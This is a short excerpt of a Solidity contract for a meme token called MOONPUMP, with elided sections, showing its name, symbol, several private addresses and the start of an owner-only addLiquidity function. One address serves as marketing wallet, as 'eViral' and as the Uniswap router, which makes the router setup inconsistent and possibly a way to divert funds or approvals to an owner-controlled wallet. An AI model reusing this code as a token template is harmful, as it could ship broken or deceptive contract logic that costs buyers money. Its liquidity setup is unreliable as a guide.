...
contract MOONPUMP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"MOONPUMP";
    string private constant _symbol = unicode"MPUMP";
    ...
    address private eViral = 0xc63202d9137677d88DcFeEFf64ed88da39AA011f; 
    address private burnAddress = 0x000000000000000000000000000000000000dEaD;
    address payable private _teamAddress;
    address payable private _marketingFunds=0xc63202d9137677d88DcFeEFf64ed88da39AA011f;
    ...
    function addLiquidity() external onlyOwner() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xc63202d9137677d88DcFeEFf64ed88da39AA011f);
